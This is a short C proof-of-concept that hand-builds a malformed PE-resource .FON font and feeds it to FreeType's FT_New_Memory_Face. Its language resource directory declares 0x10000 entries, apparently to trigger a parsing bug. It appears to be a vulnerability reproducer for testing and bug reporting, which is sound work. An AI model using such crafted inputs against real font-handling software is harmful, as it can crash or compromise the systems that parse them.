/*
 * PoC driver: feeds a crafted Windows PE-resource .FON to FT_New_Face.
 *
 * The file carries a valid MZ/PE32 header chain whose innermost
 * (language) resource directory declares 1 + 0xFFFF = 0x10000 entries,
 * with the corresponding 0x80000-byte entry array present in the file.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <ft2build.h>
#include FT_FREETYPE_H

#define RSRC  0x200  /* file offset of the .rsrc section raw data */

static void
put16( unsigned char*  p,
       unsigned int    v )
{
  p[0] = (unsigned char)( v & 0xFF );
  p[1] = (unsigned char)( ( v >> 8 ) & 0xFF );
}

static void
put32( unsigned char*   p,
       unsigned long    v )
{
  p[0] = (unsigned char)( v & 0xFF );
  p[1] = (unsigned char)( ( v >> 8 ) & 0xFF );
  p[2] = (unsigned char)( ( v >> 16 ) & 0xFF );
  p[3] = (unsigned char)( ( v >> 24 ) & 0xFF );
}

int
main( void )
{
  /* lang dir at RSRC+0x30, entry array at RSRC+0x40, 0x10000 entries */
  const size_t  size = RSRC + 0x40 + 0x80000UL;

  unsigned char*  b = (unsigned char*)calloc( 1, size );
  FT_Library      library;
  FT_Face         face;
  FT_Error        error;


  if ( !b )
    return 1;

  /* MZ header */
  put16( b + 0x00, 0x5A4D );  /* 'MZ'                    */
  put32( b + 0x3C, 0x40 );    /* lfanew: PE header at 64 */

  /* PE32 header at 0x40 (248 bytes) */
  put32( b + 0x40 +   0, 0x4550 );   /* 'PE\0\0'                */
  put16( b + 0x40 +   4, 0x014C );   /* machine: i386           */
  put16( b + 0x40 +   6, 1 );        /* number_of_sections      */
  put16( b + 0x40 +  20, 0xE0 );     /* size_of_optional_header */
  put16( b + 0x40 +  24, 0x10B );    /* magic32                 */
  put32( b + 0x40 + 136, 0x1000 );   /* rsrc_virtual_address    */
  put32( b + 0x40 + 140, 0x80000 );  /* rsrc_size               */

  /* section header at 0x40 + 248 = 0x138 (40 bytes) */
  memcpy( b + 0x138, ".rsrc\0\0\0", 8 );
  put32( b + 0x138 + 12, 0x1000 );   /* virtual_address   */
  put32( b + 0x138 + 16, 0x80000 );  /* size_of_raw_data  */
  put32( b + 0x138 + 20, RSRC );     /* pointer_to_raw_data */

  /* root resource directory at RSRC: one ID entry */
  put16( b + RSRC + 12, 0 );  /* number_of_named_entries */
  put16( b + RSRC + 14, 1 );  /* number_of_id_entries    */
  /* entry 0: type 4 (not RT_FONT), points to subdirectory at +0x18 */
  put32( b + RSRC + 16, 4 );
  put32( b + RSRC + 20, 0x80000018UL );

  /* name resource directory at RSRC+0x18: one ID entry */
  put16( b + RSRC + 0x18 + 12, 0 );
  put16( b + RSRC + 0x18 + 14, 1 );
  /* entry 0: points to subdirectory at +0x30 */
  put32( b + RSRC + 0x18 + 16, 1 );
  put32( b + RSRC + 0x18 + 20, 0x80000030UL );

  /* language resource directory at RSRC+0x30: 1 + 0xFFFF = 0x10000 */
  put16( b + RSRC + 0x30 + 12, 1 );
  put16( b + RSRC + 0x30 + 14, 0xFFFF );

  /* entry array of 0x10000 entries (0x80000 bytes, all zero) follows */

  error = FT_Init_FreeType( &library );
  if ( error )
    return 1;

  error = FT_New_Memory_Face( library, b, (FT_Long)size, 0, &face );
  printf( "FT_New_Memory_Face returned 0x%x\n", error );

  if ( !error )
    FT_Done_Face( face );
  FT_Done_FreeType( library );
  free( b );

  return 0;
}
